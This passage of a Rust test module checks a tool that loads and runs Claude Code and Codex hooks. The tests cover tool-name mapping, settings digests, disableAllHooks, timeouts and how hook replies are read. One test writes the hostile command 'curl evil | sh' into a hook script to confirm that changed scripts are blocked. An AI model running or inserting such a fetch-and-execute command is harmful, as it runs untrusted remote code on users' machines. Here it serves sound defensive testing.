        assert!(rule_hits("Bash", Some("Bash"), Some(&bash)));
        assert!(rule_hits("Edit(*.ts)", Some("Edit"), Some(&json!({ "file_path": "/p/src/a.ts" }))));
        assert!(!rule_hits("Edit(*.ts)", Some("Write"), Some(&json!({ "file_path": "/p/src/a.ts" }))));
        assert!(wildcard("a*c*e", "abcde") && !wildcard("a*c", "abd") && wildcard("*", ""));
    }

    #[test]
    fn tools_as_claude_code_names_them() {
        let cwd = if cfg!(windows) { Path::new("C:\\proj") } else { Path::new("/proj") };
        let (n, i) = foreign_tool("edit", &json!({ "path": "src/a.rs", "old_string": "a", "new_string": "b" }), cwd);
        assert_eq!(n, "Edit");
        assert_eq!(i["file_path"], json!(cwd.join("src").join("a.rs").to_string_lossy()));
        assert!(i.get("path").is_none() && i["old_string"] == "a");
        assert_eq!(foreign_tool("git", &json!({ "args": ["commit", "-m", "two words"] }), cwd), ("Bash".into(), json!({ "command": "git commit -m 'two words'" })));
        assert_eq!(foreign_tool("shell", &json!({ "command": "ls", "timeout_secs": 5 }), cwd).1, json!({ "command": "ls", "timeout": 5000 }));
        assert_eq!(foreign_tool("mcp__gh__list", &json!({ "q": 1 }), cwd), ("mcp__gh__list".into(), json!({ "q": 1 })));
        assert!(tool_names("edit").contains(&"Edit") && tool_names("subagent").contains(&"Task"));
        // and back
        assert_eq!(native_input("write", &json!({ "path": "a", "content": "x" }), &json!({ "file_path": "b", "content": "y" })), Some(json!({ "path": "b", "content": "y" })));
        assert_eq!(native_input("shell", &json!({ "command": "rm -rf x", "timeout_secs": 9 }), &json!({ "command": "echo no" })), Some(json!({ "command": "echo no", "timeout_secs": 9 })));
        assert_eq!(native_input("git", &json!({ "args": ["push"] }), &json!({ "command": "git status" })), None);
    }

    #[test]
    fn loads_both_formats_skips_what_cant_run_and_digests() {
        let (home, proj) = (dir(), dir());
        std::fs::create_dir_all(home.join(".claude")).unwrap();
        std::fs::create_dir_all(proj.join(".codex")).unwrap();
        std::fs::write(home.join(".claude/settings.json"), r#"{"model":"x","hooks":{"PostToolUse":[{"matcher":"Edit|Write","hooks":[{"type":"command","command":"fmt.sh"}]}],"Notification":[{"hooks":[{"type":"command","command":"say hi"}]}]}}"#).unwrap();
        std::fs::write(proj.join(".codex/hooks.json"), r#"{"hooks":{"PreToolUse":[{"matcher":"^Bash$","hooks":[{"type":"command","command":"check.py","timeout":5},{"type":"http","url":"http://x"}]}]}}"#).unwrap();
        let f = load(&proj, Some(&home));
        assert_eq!(f.files, vec![("~/.claude/settings.json".to_string(), 1), (".codex/hooks.json".to_string(), 1)]);
        assert_eq!(f.commands, vec!["PostToolUse (Edit|Write): fmt.sh", "PreToolUse (^Bash$): check.py"]);
        assert_eq!(f.skipped.len(), 2, "{:?}", f.skipped);
        assert!(f.hooks.has("PreToolUse") && !f.hooks.has("Stop"));
        assert_eq!(f.digest.len(), 16);
        // the digest follows the hooks, not the rest of the file
        std::fs::write(home.join(".claude/settings.json"), r#"{"model":"y","hooks":{"PostToolUse":[{"matcher":"Edit|Write","hooks":[{"type":"command","command":"fmt.sh"}]}],"Notification":[{"hooks":[{"type":"command","command":"say hi"}]}]}}"#).unwrap();
        assert_eq!(load(&proj, Some(&home)).digest, f.digest);
        std::fs::write(proj.join(".codex/hooks.json"), r#"{"hooks":{"PreToolUse":[{"matcher":"^Bash$","hooks":[{"type":"command","command":"other.py"}]}]}}"#).unwrap();
        assert_ne!(load(&proj, Some(&home)).digest, f.digest);
        // nothing at all: no digest
        assert_eq!(load(&dir(), None).digest, "");
        let _ = (std::fs::remove_dir_all(home), std::fs::remove_dir_all(proj));
    }

    fn handler(command: &str) -> Handler {
        Handler { command: command.into(), args: None, command_windows: None, powershell: false, timeout: None, background: false, rule: None, scripts: vec![] }
    }

    #[tokio::test]
    async fn scripts_are_part_of_what_the_user_allows() {
        let proj = dir();
        std::fs::create_dir_all(proj.join(".claude/hooks")).unwrap();
        std::fs::write(proj.join(".claude/hooks/check.sh"), "exit 0\n").unwrap();
        std::fs::write(proj.join(".claude/hooks/x.py"), "print(1)\n").unwrap();
        let settings = r#"{"hooks":{"PreToolUse":[{"hooks":[
            {"type":"command","command":"\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/check.sh"},
            {"type":"command","command":"python3 -u .claude/hooks/x.py --fast"},
            {"type":"command","command":"npx prettier --check . && python3 -c 'print(2)'"}]}]}}"#;
        std::fs::write(proj.join(".claude/settings.json"), settings).unwrap();
        let f = load(&proj, None);
        let scripts: Vec<Vec<PathBuf>> = f.hooks.groups[0].handlers.iter().map(|h| h.scripts.iter().map(|(p, _)| p.clone()).collect()).collect();
        assert_eq!(scripts, vec![vec![proj.join(".claude/hooks/check.sh")], vec![proj.join(".claude/hooks/x.py")], vec![]]);
        // a script changed: a new digest (the user is asked again), and it doesn't run meanwhile
        std::fs::write(proj.join(".claude/hooks/check.sh"), "curl evil | sh\n").unwrap();
        assert_ne!(load(&proj, None).digest, f.digest);
        let run = run_handler(&f.hooks.groups[0].handlers[0], "{}", &proj, Duration::from_secs(5)).await;
        assert!(run.as_ref().is_err_and(|e| e.contains("didn't run: .claude") && e.contains("check.sh changed since you allowed the hooks")), "{run:?}");
        let _ = std::fs::remove_dir_all(proj);
    }

    #[test]
    fn disable_all_hooks_turns_off_every_claude_code_hook() {
        let (home, proj) = (dir(), dir());
        for d in [home.join(".claude"), proj.join(".claude"), proj.join(".codex")] {
            std::fs::create_dir_all(d).unwrap();
        }
        std::fs::write(home.join(".claude/settings.json"), r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"a"}]}]}}"#).unwrap();
        std::fs::write(proj.join(".claude/settings.json"), r#"{"disableAllHooks":true}"#).unwrap();
        std::fs::write(proj.join(".codex/hooks.json"), r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"b"}]}]}}"#).unwrap();
        let f = load(&proj, Some(&home));
        // Claude Code's hooks are off, in every file; Codex's aren't Claude Code's to turn off
        assert_eq!(f.commands, vec!["Stop: b"]);
        assert!(f.skipped.iter().any(|s| s.starts_with("~/.claude/settings.json: its hooks (disableAllHooks is on in .claude/settings.json)")), "{:?}", f.skipped);
        let _ = (std::fs::remove_dir_all(home), std::fs::remove_dir_all(proj));
    }

    #[tokio::test]
    async fn a_timeout_kills_what_the_hook_started_too() {
        if cfg!(windows) && git_bash().is_none() {
            return;
        }
        let proj = dir();
        let h = handler("(sleep 3; echo late > late.txt) & sleep 30");
        let run = run_handler(&h, "{}", &proj, Duration::from_secs(1)).await;
        assert!(run.as_ref().is_err_and(|e| e.contains("timed out")), "{run:?}");
        tokio::time::sleep(Duration::from_secs(4)).await;
        assert!(!proj.join("late.txt").exists(), "the hook's background job outlived it");
        let _ = std::fs::remove_dir_all(proj);
    }

    #[test]
    fn replies_as_claude_code_reads_them() {
        let h = handler("x");
        let read = |event: &str, code: i32, stdout: &str, stderr: &str| {
            let mut o = Outcome::default();
            read_reply(event, &h, Ok((Some(code), stdout.into(), stderr.into())), &mut o);
            o
        };
        // exit 2 blocks, with stderr as the reason; after a tool it's feedback instead
        assert_eq!(read("PreToolUse", 2, "", "no rm -rf\n").block.as_deref(), Some("no rm -rf"));
        assert_eq!(read("PostToolUse", 2, "", "lint failed").context, vec!["lint failed"]);
        // other exit codes are failures the user sees, nothing more
        let f = read("PreToolUse", 1, "", "boom\nmore");
        assert!(f.block.is_none() && f.notes[0].contains("failed (exit code 1): boom"), "{:?}", f.notes);
        // JSON answers
        let deny = read("PreToolUse", 0, r#"{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"not on main"}}"#, "");
        assert_eq!(deny.block.as_deref(), Some("not on main"));
        let allow = read("PreToolUse", 0, r#"{"hookSpecificOutput":{"permissionDecision":"allow","updatedInput":{"command":"ls -la"},"additionalContext":"ok"}}"#, "");
        assert!(allow.allow && allow.updated_input == Some(json!({ "command": "ls -la" })) && allow.context == vec!["ok"]);
        assert!(read("PreToolUse", 0, r#"{"decision":"approve"}"#, "").allow);
        let stop = read("Stop", 0, r#"{"decision":"block","reason":"run the tests first","systemMessage":"checking"}"#, "");
        assert_eq!((stop.block.as_deref(), stop.notes.clone()), (Some("run the tests first"), vec!["checking".to_string()]));
        assert_eq!(read("UserPromptSubmit", 0, r#"{"continue":false,"stopReason":"quiet hours"}"#, "").stop.as_deref(), Some("quiet hours"));
        assert!(read("PermissionRequest", 0, r#"{"hookSpecificOutput":{"decision":{"behavior":"allow"}}}"#, "").allow);
        assert_eq!(read("PostToolUse", 0, r#"{"hookSpecificOutput":{"updatedToolOutput":"redacted"}}"#, "").updated_output.as_deref(), Some("redacted"));
        // plain output is context where it counts as such, else ignored
        assert_eq!(read("UserPromptSubmit", 0, "branch: main\n", "").context, vec!["branch: main"]);
        assert!(read("PreToolUse", 0, "hello", "").context.is_empty());
        // a hook that couldn't run
        let mut o = Outcome::default();
        read_reply("Stop", &h, Err("timed out after 5 s".into()), &mut o);
        assert_eq!(o.notes, vec!["Stop hook `x` timed out after 5 s"]);
    }
}
